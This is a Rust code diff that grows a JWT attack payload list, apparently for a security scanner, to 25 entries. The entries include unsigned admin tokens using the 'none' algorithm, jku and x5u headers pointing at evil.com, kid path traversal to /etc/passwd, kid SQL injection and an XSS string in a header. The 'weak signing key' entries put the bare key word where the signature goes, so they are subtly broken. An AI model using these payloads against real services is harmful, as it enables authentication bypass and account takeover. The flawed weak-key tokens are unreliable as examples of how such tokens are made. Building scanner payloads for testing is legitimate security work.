@@ -669,6 +669,7 @@ pub fn get_payloads() -> Vec<Payload> {
     let none_alg_header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"none","typ":"JWT"}"#);
     let payload = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
 
+    // 1. none algorithm bypass
     payloads.push(Payload {
         payload_type: PayloadType::Jwt,
         payload: format!("{}.{}.", none_alg_header, payload),
@@ -677,6 +678,7 @@ pub fn get_payloads() -> Vec<Payload> {
         tags: vec!["jwt".to_string(), "bypass".to_string()],
     });
 
+    // 2. HS256 algorithm confusion
     payloads.push(Payload {
         payload_type: PayloadType::Jwt,
         payload: "alg=HS256".to_string(),
@@ -685,14 +687,78 @@ pub fn get_payloads() -> Vec<Payload> {
         tags: vec!["jwt".to_string(), "algorithm_confusion".to_string()],
     });
 
+    // 3. HS384 algorithm confusion
     payloads.push(Payload {
         payload_type: PayloadType::Jwt,
-        payload: "exp=9999999999".to_string(),
-        description: "Far future expiration".to_string(),
-        severity: Severity::Medium,
-        tags: vec!["jwt".to_string(), "expiration".to_string()],
+        payload: "alg=HS384".to_string(),
+        description: "Algorithm confusion RS384->HS384".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["jwt".to_string(), "algorithm_confusion".to_string()],
     });
 
+    // 4. HS512 algorithm confusion
+    payloads.push(Payload {
+        payload_type: PayloadType::Jwt,
+        payload: "alg=HS512".to_string(),
+        description: "Algorithm confusion RS512->HS512".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["jwt".to_string(), "algorithm_confusion".to_string()],
+    });
+
+    // 5. none uppercase
+    {
+        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"NONE","typ":"JWT"}"#);
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.", header, body),
+            description: "JWT NONE algorithm uppercase bypass".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["jwt".to_string(), "bypass".to_string()],
+        });
+    }
+
+    // 6. none mixed case
+    {
+        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"None","typ":"JWT"}"#);
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.", header, body),
+            description: "JWT None mixed case algorithm bypass".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["jwt".to_string(), "bypass".to_string()],
+        });
+    }
+
+    // 7. exp=0 bypass
+    payloads.push(Payload {
+        payload_type: PayloadType::Jwt,
+        payload: "exp=0".to_string(),
+        description: "JWT exp=0 expiration bypass".to_string(),
+        severity: Severity::Medium,
+        tags: vec!["jwt".to_string(), "expiration".to_string(), "bypass".to_string()],
+    });
+
+    // 8. nbf far future
+    payloads.push(Payload {
+        payload_type: PayloadType::Jwt,
+        payload: "nbf=9999999999".to_string(),
+        description: "JWT nbf far future not-before bypass".to_string(),
+        severity: Severity::Medium,
+        tags: vec!["jwt".to_string(), "claims".to_string(), "bypass".to_string()],
+    });
+
+    // 9. missing exp claim
+    payloads.push(Payload {
+        payload_type: PayloadType::Jwt,
+        payload: r#"{"sub":"admin"}"#.to_string(),
+        description: "JWT missing exp claim".to_string(),
+        severity: Severity::Medium,
+        tags: vec!["jwt".to_string(), "claims".to_string()],
+    });
+
+    // 10. jku header injection
     payloads.push(Payload {
         payload_type: PayloadType::Jwt,
         payload: "jku=https://evil.com/jwks.json".to_string(),
@@ -700,6 +766,215 @@ pub fn get_payloads() -> Vec<Payload> {
         severity: Severity::High,
         tags: vec!["jwt".to_string(), "injection".to_string()],
     });
+
+    // 11. jku well-known endpoint
+    payloads.push(Payload {
+        payload_type: PayloadType::Jwt,
+        payload: "jku=https://evil.com/.well-known/jwks.json".to_string(),
+        description: "JKU well-known endpoint injection".to_string(),
+        severity: Severity::High,
+        tags: vec!["jwt".to_string(), "injection".to_string()],
+    });
+
+    // 12. x5c header injection
+    {
+        let header = base64::Engine::encode(
+            &URL_SAFE_NO_PAD,
+            r#"{"alg":"RS256","typ":"JWT","x5c":["<script>alert(1)</script>"]}"#,
+        );
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.sig", header, body),
+            description: "X5C header injection with XSS payload".to_string(),
+            severity: Severity::High,
+            tags: vec!["jwt".to_string(), "injection".to_string(), "xss".to_string()],
+        });
+    }
+
+    // 13. kid path traversal
+    {
+        let header = base64::Engine::encode(
+            &URL_SAFE_NO_PAD,
+            r#"{"alg":"RS256","typ":"JWT","kid":"../../etc/passwd"}"#,
+        );
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.sig", header, body),
+            description: "KID path traversal to read /etc/passwd".to_string(),
+            severity: Severity::High,
+            tags: vec!["jwt".to_string(), "injection".to_string(), "path_traversal".to_string()],
+        });
+    }
+
+    // 14. kid null byte injection
+    {
+        let header = base64::Engine::encode(
+            &URL_SAFE_NO_PAD,
+            r#"{"alg":"RS256","typ":"JWT","kid":"good-key\u0000../../etc/passwd"}"#,
+        );
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.sig", header, body),
+            description: "KID null byte injection for key path bypass".to_string(),
+            severity: Severity::High,
+            tags: vec!["jwt".to_string(), "injection".to_string(), "null_byte".to_string()],
+        });
+    }
+
+    // 15. kid SQL injection
+    {
+        let header = base64::Engine::encode(
+            &URL_SAFE_NO_PAD,
+            r#"{"alg":"RS256","typ":"JWT","kid":"' OR '1'='1"}"#,
+        );
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.sig", header, body),
+            description: "KID SQL injection in header".to_string(),
+            severity: Severity::High,
+            tags: vec!["jwt".to_string(), "injection".to_string(), "sqli".to_string()],
+        });
+    }
+
+    // 16. jwk embedded key
+    {
+        let header = base64::Engine::encode(
+            &URL_SAFE_NO_PAD,
+            r#"{"alg":"RS256","typ":"JWT","jwk":{"kty":"oct","k":"dGVzdA=="}}"#,
+        );
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.sig", header, body),
+            description: "JWK embedded public key injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["jwt".to_string(), "injection".to_string(), "jwk".to_string()],
+        });
+    }
+
+    // 17. x5u URL injection
+    {
+        let header = base64::Engine::encode(
+            &URL_SAFE_NO_PAD,
+            r#"{"alg":"RS256","typ":"JWT","x5u":"https://evil.com/cert.pem"}"#,
+        );
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.sig", header, body),
+            description: "X5U URL injection for certificate redirect".to_string(),
+            severity: Severity::High,
+            tags: vec!["jwt".to_string(), "injection".to_string()],
+        });
+    }
+
+    // 18. null header (empty body)
+    {
+        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, "{}");
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.sig", header, body),
+            description: "JWT null/empty header".to_string(),
+            severity: Severity::High,
+            tags: vec!["jwt".to_string(), "malformed".to_string()],
+        });
+    }
+
+    // 19. weak signing key - secret
+    {
+        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.secret", header, body),
+            description: "Weak signing key: secret".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["jwt".to_string(), "weak_key".to_string()],
+        });
+    }
+
+    // 20. weak signing key - password
+    {
+        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.password", header, body),
+            description: "Weak signing key: password".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["jwt".to_string(), "weak_key".to_string()],
+        });
+    }
+
+    // 21. weak signing key - 123456
+    {
+        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.123456", header, body),
+            description: "Weak signing key: 123456".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["jwt".to_string(), "weak_key".to_string()],
+        });
+    }
+
+    // 22. weak signing key - admin
+    {
+        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.admin", header, body),
+            description: "Weak signing key: admin".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["jwt".to_string(), "weak_key".to_string()],
+        });
+    }
+
+    // 23. weak signing key - test
+    {
+        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.test", header, body),
+            description: "Weak signing key: test".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["jwt".to_string(), "weak_key".to_string()],
+        });
+    }
+
+    // 24. weak signing key - changeme
+    {
+        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.changeme", header, body),
+            description: "Weak signing key: changeme".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["jwt".to_string(), "weak_key".to_string()],
+        });
+    }
+
+    // 25. weak signing key - key
+    {
+        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
+        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
+        payloads.push(Payload {
+            payload_type: PayloadType::Jwt,
+            payload: format!("{}.{}.key", header, body),
+            description: "Weak signing key: key".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["jwt".to_string(), "weak_key".to_string()],
+        });
+    }
 
     payloads
 }
@@ -829,7 +1104,7 @@ mod tests {
     fn minimum_payload_count() {
         let payloads = get_payloads();
         assert!(
-            payloads.len() >= 3,
+            payloads.len() >= 15,
             "Must have JWT payload coverage, got {}",
             payloads.len()
         );
